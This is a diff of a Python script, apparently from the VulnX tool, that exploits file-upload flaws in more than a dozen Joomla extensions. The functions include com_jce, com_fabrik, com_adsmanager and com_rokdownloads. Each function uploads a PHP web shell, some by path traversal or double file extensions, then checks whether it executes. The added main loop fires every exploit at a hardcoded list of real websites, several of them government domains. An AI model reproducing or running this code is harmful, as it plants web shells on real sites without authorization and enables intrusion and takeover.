@@ -1,6 +1,8 @@
 ﻿import os
 import requests
 import re
+import warnings
+warnings.filterwarnings("ignore")
 import curlify
 def com_jce(url):
         headers = {}
@@ -13,10 +15,10 @@ def com_jce(url):
                 'action':'Upload',
         }
         r = requests.post(endpoint, data=data, headers=headers,verify=False)
-        print("curl : " ,curlify.to_curl(r.request))
+       ##print("curl : " ,curlify.to_curl(r.request))
         dump_data = url + "/VulnX.gif"
         res=requests.get(dump_data, headers)
-        print("detect : " ,curlify.to_curl(res.request))
+        ##print("detect : " ,curlify.to_curl(res.request))
         matches = re.findall(re.compile(r'/image/gif/'),res.text)
         if matches:
             return dict(
@@ -32,17 +34,23 @@ def com_jce(url):
                 status=False
             )
 def com_media(url):
-        headers = {} 
+        headers = {}
         headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
         endpoint = url+"/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder="
-        headers={"content-type":["form-data"]}
+        headers={"content-type":"form-data"}
         fieldname = 'Filedata[]'
         shell = open('shell/VulnX.txt','rb')
+        #print(shell)
         data = {
                 fieldname:shell,
         }
-        requests.post(endpoint, data=data, headers=headers,verify=False).text
+        r = requests.post(endpoint, data=data, headers=headers,verify=False)
+        #print("curl : " ,curlify.to_curl(r.request))
         dump_data = endpoint+"/images/XAttacker.txt"
+        res=requests.get(dump_data, headers)
+        #print("detect : " ,curlify.to_curl(res.request))
+        matches = re.findall(re.compile(r'/image/gif/'),res.text)
+        
         response = requests.get(dump_data,headers,verify=False).text
         if re.findall(r'Tig', response):
             return dict(
@@ -61,14 +69,18 @@ def com_fabrika(url):
         headers = {} 
         headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
         endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
-        headers={"content-type":["form-data"]}
+        headers={"content-type":"form-data"}
         fieldname = 'file'
         shell = open('shell/VulnX.php','rb')
         data = {
                 fieldname:shell,
         }
-        requests.post(endpoint, data=data, headers=headers).text
+        #print(data)
+        r = requests.post(endpoint, data=data, headers=headers)
+        ##print("curl : " ,curlify.to_curl(r.request))
         dump_data = endpoint+"/images/XAttacker.txt"
+        res=requests.get(dump_data, headers)
+        #print("detect : " ,curlify.to_curl(res.request))
         response = requests.get(dump_data,headers,verify=False).text
         if re.findall(r'Vuln X', response):
             return dict(
@@ -89,13 +101,14 @@ def com_fabrikb(url):
         endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
 
 
-        headers={"content-type":["form-data"]}
+        headers={"content-type":"form-data"}
         fieldname = 'file'
         shell = open('shell/VulnX.txt','rb')
         data = {
                 fieldname:shell,
         }
-        requests.post(endpoint, data=data, headers=headers,verify=False).text
+        r = requests.post(endpoint, data=data, headers=headers)
+        #print("curl : " ,curlify.to_curl(r.request))
         dump_data = endpoint+"/images/XAttacker.txt"
         response = requests.get(dump_data,headers,verify=False).text
         if re.findall(r'Tig', response):
@@ -120,13 +133,14 @@ def com_foxcontact(url):
     #            'components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php'}
         endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
 
-        headers={"content-type":["form-data"]}
+        headers={"content-type":"form-data"}
         fieldname = 'file'
         shell = open('shell/VulnX.txt','rb')
         data = {
                 fieldname:shell,
         }
-        requests.post(endpoint, data=data, headers=headers,verify=False).text
+        r =requests.post(endpoint, data=data, headers=headers,verify=False)
+        #print("curl : " ,curlify.to_curl(r.request))
         dump_data = endpoint+"/images/XAttacker.txt"
         response = requests.get(dump_data,headers).text
         if re.findall(r'Tig', response):
@@ -143,11 +157,18 @@ def com_foxcontact(url):
                 status=False
             )
 def com_adsmanager(url):
+        headers = {} 
+        proxies = {
+        "http": "http://127.0.0.1:8080",
+        "https": "https://127.0.0.1:8080",
+        }
         endpoint = url + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
-        img = open('shell/VulnX.php', 'rb')
+        img = 'shell/VulnX.php'
         name_img= os.path.basename('shell/VulnX.html')
-        files= {'image': (name_img,img,'form-data',{'Expires': '0'}) }
-        requests.post(endpoint,files=files ,headers=headers,verify=False)
+        files= {'image': img }
+        #print(files)
+        r = requests.post(endpoint,files=files ,headers=headers,verify=False)
+        ##print("curl : " ,curlify.to_curl(r.request))
         shellup = url + "/tmp/plupload/VulnX.html"
         checkShell = requests.get(shellup).text
         statusCheck = re.findall(re.compile(r'VulnX'),checkShell)
@@ -165,9 +186,11 @@ def com_adsmanager(url):
                 status=False
             )
 def com_blog(url):
+        headers = {} 
         endpoint = url + "/index.php?option=com_myblog&task=ajaxupload"
-        checkShell = requests.get(endpoint,headers=headers,verify=False).text
-        statusCheck = re.findall(re.compile(r'has been uploaded'),checkShell)
+        r = requests.get(endpoint,headers=headers,verify=False)
+        #print("curl : " ,curlify.to_curl(r.request))
+        statusCheck = re.findall(re.compile(r'has been uploaded'),r.text)
         if statusCheck:
             return dict(
                 url=url,
@@ -208,7 +231,8 @@ def comweblinks(url):
         fieldname = "image[]"
         files= {'image': (name_img,img,'form-data',{'Expires': '0'})}
         data = { fieldname : files }
-        requests.post(endpoint, data=data, headers=headers,verify=False).text
+        r=requests.post(endpoint, data=data, verify=False)
+        #print("curl : " ,curlify.to_curl(r.request))
         shellup = url + "/images/VulnX.gif"
         checkShell = requests.get(shellup)
         if checkShell.status_code == 200:
@@ -224,12 +248,16 @@ def comweblinks(url):
                 name="comweblinks",
                 status=False
             )
+#fail
 def mod_simplefileupload(url):
+        headers = {}
         endpoint = url + "/modules/mod_simplefileuploadv1.3/elements/udd.php"
         img = open('shell/VulnX.php.mp4', 'rb')
         name_img= os.path.basename('shell/VulnX.php.mp4')
         files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
-        requests.post(endpoint, files=files, headers=headers,verify=False)
+        #print(files)
+        r = requests.post(endpoint, headers=headers,data = {},files=files)
+        #print("curl : " ,curlify.to_curl(r.request))
         shellup = url + "/modules/mod_simplefileuploadv1.3/elements/VulnX.php?Vuln=X"
         checkShell = requests.get(shellup).text
         statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
@@ -247,14 +275,22 @@ def mod_simplefileupload(url):
                 status=False
             )
 def com_jbcatalog(url):
-        endpoint = url + "/components/com_jbcatalog/libraries/jsupload/server/php"
+        headers={}
+        proxies = {
+        "http": "http://127.0.0.1:8080",
+        "https": "https://127.0.0.1:8080",
+        }
+        endpoint = url + "components/com_jbcatalog/libraries/jsupload/server/php"
         img = open('shell/VulnX.php', 'rb')
         name_img= os.path.basename('shell/VulnX.php')
         fieldname = "image[]"
         files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
         data = { fieldname : files }
-        requests.post(endpoint, data=data, headers=headers,verify=False).text
-        shellup = url + "/components/com_jbcatalog/libraries/jsupload/server/php/files/VulnX.php?Vuln=X"
+        #print(endpoint, headers, data)
+        r = requests.post(endpoint, headers=headers, data=data,verify=True)
+        #print(endpoint, headers, data)
+        #print("curl : " ,curlify.to_curl(r.request))
+        shellup = url + "components/com_jbcatalog/libraries/jsupload/server/php/files/VulnX.php?Vuln=X"
         checkShell = requests.get(shellup).text
         statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
         if statusCheck:
@@ -277,7 +313,7 @@ def com_sexycontactform(url):
         fieldname = "image[]"
         files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
         data = { fieldname : files }
-        requests.post(endpoint, data=data, heades=headers,verify=False).text
+        requests.post(endpoint, data=data,verify=False).text
         shellup = url + "/com_sexycontactform/fileupload/files/files/VulnX.php?Vuln=X"
         checkShell = requests.get(shellup,headers=headers,verify=False).text
         statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
@@ -295,6 +331,7 @@ def com_sexycontactform(url):
                 status=False
             )
 def com_rokdownloads(url):
+        headers = {}
         endpoint = url + "/administrator/components/com_rokdownloads/assets/uploadhandler.php"
         img = open('shell/VulnX.php', 'rb')
         name_img= os.path.basename('shell/VulnX.php')
@@ -303,7 +340,8 @@ def com_rokdownloads(url):
         data = { fieldname : files,
                 'jpath' : '..%2F..%2F..%2F..%2F',
                 }
-        requests.post(endpoint, data=data, headers=headers,verify=False).text
+        r = requests.post(endpoint, data=data, headers=headers,verify=False)
+        #print("curl : " ,curlify.to_curl(r.request))
         shellup = url + "/images/stories/VulnX.php?Vuln=X"
         checkShell = requests.get(shellup,headers=headers,verify=False).text
         statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
@@ -396,4 +434,52 @@ def com_facileforms(url):
                 name="com_facileforms",
                 status=False
             )
-print(com_jce('http://boumaghis.free.fr/'))
+def main(url):
+    try:
+        jce = com_jce(url)
+        media = com_media(url)
+        fabrika = com_fabrika(url)
+        fabrikb = com_fabrikb(url)
+        foxcontact = com_foxcontact(url)
+        adsmanager = com_adsmanager(url)
+        users = com_users(url)
+        weblinks = comweblinks(url)
+        simplefileupload = mod_simplefileupload(url)
+        jbcatalog = com_jbcatalog(url)
+        sexycontactform = com_sexycontactform(url)
+        rokdownloads = com_rokdownloads(url)
+        extplorer = com_extplorer(url)
+        jwallpapers = com_jwallpapers(url)
+        facileforms = com_facileforms(url)
+        List.append(jce)
+        List.append(media)
+        List.append(fabrika)
+        List.append(fabrikb)
+        List.append(foxcontact)
+        List.append(adsmanager)
+        List.append(users)
+        List.append(weblinks)
+        List.append(simplefileupload)
+        List.append(jbcatalog)
+        List.append(sexycontactform)
+        List.append(rokdownloads)
+        List.append(extplorer)
+        List.append(jwallpapers)
+        List.append(facileforms)
+    except:
+        pass
+
+List = []
+headers = {}
+urls = ['http://www.nookfarmborrowdale.co.uk/','https://www.miamilakes-fl.gov/','http://spbrta.customs.ru/','http://www.lindisfarne-keswick.co.uk/','http://www.tohsband.org/','https://www.pa-tulangbawang.go.id/','https://184.154.52.107/','https://espi.or.at/index.php','http://www.in.cnr.it/']
+for url in urls:
+    print(f"scan >>>>> {url} ")
+    main(url)
+    for i in List:
+        if i["status"]:
+            print(i)
+print("===================================end============================")
+for i in List:
+    if i["status"]:
+        print(i)
+print("===========================stop======================")
